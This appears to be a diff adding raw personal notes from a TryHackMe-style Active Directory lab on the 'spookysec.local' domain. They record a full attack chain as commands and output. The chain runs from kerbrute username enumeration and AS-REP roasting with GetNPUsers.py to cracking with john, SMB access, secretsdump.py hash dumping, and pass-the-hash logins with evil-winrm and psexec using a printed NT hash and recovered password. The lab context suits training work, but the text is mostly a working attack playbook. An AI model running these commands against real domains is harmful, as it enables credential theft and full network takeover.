@@ -1,0 +1,67 @@
+# install go & set the ~/.zshrc
+tar -C /usr/local/ <go-tar.gz file>
+export GOROOT=/usr/local/go
+export PATH=$PATH:$GOROOT/bin
+make all
+ls dist
+
+# kerbrute
+./kerbrute_linux_386 userenum --dc 10.10.240.73 -d spookysec.local user.txt 
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 06/21/22 - Ronnie Flathers @ropnop
+
+2022/06/21 02:22:50 >  Using KDC(s):
+2022/06/21 02:22:50 >  	10.10.240.73:88
+
+2022/06/21 02:22:50 >  [+] VALID USERNAME:	 james@spookysec.local
+2022/06/21 02:22:50 >  [+] VALID USERNAME:	 svc-admin@spookysec.local
+2022/06/21 02:22:51 >  [+] VALID USERNAME:	 James@spookysec.local
+2022/06/21 02:22:51 >  [+] VALID USERNAME:	 robin@spookysec.local
+2022/06/21 02:22:52 >  [+] VALID USERNAME:	 darkstar@spookysec.local
+2022/06/21 02:22:52 >  [+] VALID USERNAME:	 administrator@spookysec.local
+2022/06/21 02:22:54 >  [+] VALID USERNAME:	 backup@spookysec.local
+2022/06/21 02:22:54 >  [+] VALID USERNAME:	 paradox@spookysec.local
+2022/06/21 02:22:58 >  [+] VALID USERNAME:	 JAMES@spookysec.local
+2022/06/21 02:23:00 >  [+] VALID USERNAME:	 Robin@spookysec.local
+2022/06/21 02:23:09 >  [+] VALID USERNAME:	 Administrator@spookysec.local
+2022/06/21 02:23:25 >  [+] VALID USERNAME:	 Darkstar@spookysec.local
+2022/06/21 02:23:31 >  [+] VALID USERNAME:	 Paradox@spookysec.local
+2022/06/21 02:23:32 >  Done! Tested 31812 usernames (13 valid) in 42.339 seconds
+root@ip-10-10-190-249:~# 
+
+ users list dynamically queried with an LDAP anonymous bind
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'
+
+# with a users file
+GetNPUsers.py -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'
+
+# users list dynamically queried with a LDAP authenticated bind (password)
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'
+
+# users list dynamically queried with a LDAP authenticated bind (NT hash)
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes 'LMihash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
+
+
+# get the users who have no pre-authentication requirements - the account doesnot need to provide valid identification before requesting a kerberos ticket 
+./GetNPUsers.py -request -format hashcat -usersfile /home/kali/Documents/THM/rooms/active_directory/samples/userlist2.txt -no-pass -dc-ip 10.10.135.219 -outputfile /home/kali/Documents/THM/rooms/active_directory/users_no_pre_authentication.txt spookysec.local/
+
+# cracking a hash
+john --wordlist=samples/passwordlist.txt --format=krb5asrep users_no_pre_authentication.txt
+
+smbclient -L \10.10.65.245\ADMIN$ -U 'spooksec.local\svc-admin'
+smbclient \10.10.65.245ackup -U 'spooksec.local\svc-admin'
+echo 'YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw' | base64 -d
+
+
+./secretsdump.py spookysec.local/backup:backup2517860@10.10.65.245 -dc-ip 10.10.65.245 -outputfile /home/kali/Documents/THM/rooms/active_directory/secrets_dump_from_impacket_scripts.txt
+
+
+evil-winrm -i 10.10.65.245 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
+
+./psexec.py Administrator@10.10.65.245 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
